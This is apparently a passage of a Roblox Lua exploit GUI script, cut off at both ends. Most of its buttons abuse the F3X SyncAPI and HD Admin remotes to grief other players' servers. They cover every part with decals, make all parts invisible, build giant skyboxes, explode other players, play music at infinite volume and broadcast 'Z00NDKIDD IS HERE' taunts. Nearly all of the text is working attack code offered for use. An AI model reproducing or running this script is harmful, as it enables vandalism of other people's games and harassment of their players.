f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";chat all MUAHAHAHA Z00NDKIDD IS HERE")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.631, 0,0.411, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Decal 3"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 26
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character or player.CharacterAdded:Wait()
	local tool

	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	if not tool then
		warn("Tool com SyncAPI não encontrado.")
		return
	end

	local remote = tool.SyncAPI.ServerEndpoint

	local function _(args)
		remote:InvokeServer(unpack(args))
	end



	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}
		_(args)
	end

	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end

	function spam(id)
		for i,v in workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end


	spam("120126542650323") 
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.772, 0,0.409, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Explode All"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 23
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";Explode all")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.056, 0,0.446, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Skeleton Skybox"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 14
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character or player.CharacterAdded:Wait()
	local tool

	for i, v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	for i, v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	if not tool then
		warn("SyncAPI não encontrado!")
		return
	end

	local remote = tool.SyncAPI.ServerEndpoint
	local RunService = game:GetService("RunService")

	local function _(args)
		remote:InvokeServer(unpack(args))
	end

	local function CreatePart(cf, parent)
		_({ "CreatePart", "Normal", cf, parent })
	end

	local function SetAnchor(part, boolean)
		_({ "SyncAnchor", { { Part = part, Anchored = boolean } } })
	end

	local function AddMesh(part)
		_({ "CreateMeshes", { { Part = part } } })
	end

	local function SetMesh(part, meshid)
		_({ "SyncMesh", { { Part = part, MeshId = "rbxassetid://" .. meshid } } })
	end

	local function SetTexture(part, texid)
		_({ "SyncMesh", { { Part = part, TextureId = texid } } })
	end

	local function MeshResize(part, size)
		_({ "SyncMesh", { { Part = part, Scale = size } } })
	end

	local function SetTransparency(part, value)
		_({ "SyncTransparency", { { Part = part, Transparency = value } } })
	end

	local function DestroyPart(part)
		_({ "Remove", { part } })
	end

	local images = {
		"http://www.roblox.com/asset/?id=169585459",
		"http://www.roblox.com/asset/?id=169585475",
		"http://www.roblox.com/asset/?id=169585485",
		"http://www.roblox.com/asset/?id=169585502",
		"http://www.roblox.com/asset/?id=169585515",
		"http://www.roblox.com/asset/?id=169585502",
		"http://www.roblox.com/asset/?id=169585485",
		"http://www.roblox.com/asset/?id=169585475"
	}

	local skyPart = nil
	local skyLoop = nil
	local frameTime = 1 / 10
	local lastUpdate = 0

	local function CreateSky()
		local hrp = char:FindFirstChild("HumanoidRootPart")
		if not hrp then return end

		local cf = hrp.CFrame
		CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)

		for i = 1, 50 do
			task.wait()
			for _, v in workspace:GetDescendants() do
				if v:IsA("BasePart") and (v.Position - (cf.Position + Vector3.new(0, 6, 0))).Magnitude < 1 then
					skyPart = v
					break
				end
			end
			if skyPart then break end
		end

		if not skyPart then return end

		SetAnchor(skyPart, true)
		AddMesh(skyPart)
		SetMesh(skyPart, "111891702759441")
		MeshResize(skyPart, Vector3.new(8000, 8000, 8000))
		SetTransparency(skyPart, 0)

		local index = 1
		skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
			lastUpdate = lastUpdate + deltaTime
			if lastUpdate >= frameTime then
				lastUpdate = 0
				if not skyPart then
					skyLoop:Disconnect()
					return
				end
				SetTexture(skyPart, images[index])
				index = (index % #images) + 1
			end
		end)
	end

	local function ResetSky()
		if skyLoop then
			skyLoop:Disconnect()
			skyLoop = nil
		end
		if skyPart then
			DestroyPart(skyPart)
			skyPart = nil
		end
		task.spawn(CreateSky)
	end

	player.CharacterAdded:Connect(function(newChar)
		char = newChar
		ResetSky()
	end)

	if char and char:FindFirstChild("Humanoid") then
		char:WaitForChild("Humanoid").Died:Connect(function()
			ResetSky()
		end)
	end

	CreateSky()
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.195, 0,0.446, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "invisible all"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 21
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function spam(id)
		for i,v in game.workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetTrans(v,math.random(1,1))
				end)
			end
		end 
	end
	spam("72497671152590")

end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.337, 0,0.446, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "visible all"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 21
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function spam(id)
		for i,v in game.workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetTrans(v,math.random(0,0))
				end)
			end
		end 
	end
	spam("72497671152590")

end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.48, 0,0.45, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Shedletsky"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 21
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color,
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}
		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				SetName(v,"Skybox")
				AddMesh(v)
				SetMesh(v,"111891702759441")
				SetTexture(v,id)
				MeshResize(v,Vector3.new(7200, 7200, 7200))
				SetLocked(v,true)
			end
		end
	end
	Sky("172423468")


end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.619, 0,0.452, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Idiot"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 21
f3x.Parent = mainFrame
f3x.MouseButton1Click:Connect(function()


	local player = game.Players.LocalPlayer
	local char = player.Character or player.CharacterAdded:Wait()
	local tool

	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	if not tool then
		warn("Tool com SyncAPI não encontrado.")
		return
	end

	local remote = tool.SyncAPI.ServerEndpoint

	local function _(args)
		remote:InvokeServer(unpack(args))
	end



	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}
		_(args)
	end

	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end

	function spam(id)
		for i,v in workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end


	spam("92327640350574") 
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.772, 0,0.45, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Mario Spam"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 21
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	wait(0.1)


	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 1332644289")
	RequestCommand:InvokeServer(";pitch 0.80")
	RequestCommand:InvokeServer(";volume inf")

	wait(3.1)

	RequestCommand:InvokeServer(";music 2496367477")
	RequestCommand:InvokeServer(";volume inf")


	local player = game.Players.LocalPlayer
	local char = player.Character or player.CharacterAdded:Wait()
	local tool

	for _, v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for _, v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	if not tool then
		warn("SyncAPI não encontrado!")
		return
	end

	local remote = tool.SyncAPI.ServerEndpoint
	local function _(args)
		remote:InvokeServer(unpack(args))
	end

	local function SetName(part, name)
		_({ "SetName", { part }, name })
	end

	local function CreatePart(cf, parent)
		_({ "CreatePart", "Normal", cf, parent })
	end

	local function AddMesh(part)
		_({ "CreateMeshes", { { Part = part } } })
	end

	local function SetMesh(part, meshid)
		_({ "SyncMesh", { { Part = part, MeshId = "rbxassetid://" .. meshid } } })
	end

	local function SetTexture(part, texid)
		_({ "SyncMesh", { { Part = part, TextureId = "rbxassetid://" .. texid } } })
	end

	local function MeshResize(part, size)
		_({ "SyncMesh", { { Part = part, Scale = size } } })
	end

	local function SetLocked(part, bool)
		_({ "SetLocked", { part }, bool })
	end

	local function SpawnDecal(part, face)
		_({ "CreateTextures", { { Part = part, Face = face, TextureType = "Decal" } } })
	end

	local function AddDecal(part, asset, face)
		_({
			"SyncTexture",
			{ {
				Part = part,
				Face = face,
				TextureType = "Decal",
				Texture = "rbxassetid://" .. asset
			} }
		})
	end


	local function spam(id)
		for _, v in workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v, false)
					for _, face in ipairs(Enum.NormalId:GetEnumItems()) do
						SpawnDecal(v, face)
						AddDecal(v, id, face)
					end
				end)
			end
		end
	end

	spam("106819842627724")

	wait(5)


	local function Sky(id)
		local pos = char:WaitForChild("HumanoidRootPart").CFrame.Position
		local skyPos = Vector3.new(math.floor(pos.X), math.floor(pos.Y) + 6, math.floor(pos.Z))
		CreatePart(CFrame.new(skyPos), workspace)

		task.wait(1) 

		for _, v in workspace:GetDescendants() do
			if v:IsA("BasePart") and (v.Position - skyPos).Magnitude < 1 then
				SetName(v, "Sky")
				AddMesh(v)
				SetMesh(v, "111891702759441")
				SetTexture(v, id)
				MeshResize(v, Vector3.new(8000, 8000, 8000))
				SetLocked(v, true)
				break
			end
		end
	end

	Sky("2577916730")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.056, 0,0.486, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Title Others"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 21
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";Titlebk Others Z00ndKidd")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.195, 0,0.485, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Explode Others"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 15
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";explode others")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.337, 0,0.486, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Alert"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 27
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";Alert all Z00ndkidd is here")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.48, 0,0.489, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Alert 2"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 27
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";Alert all MUAHAHAHA Z00NDKIDD IS HERE")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.619, 0,0.489, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Night"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 27
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";time 0")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
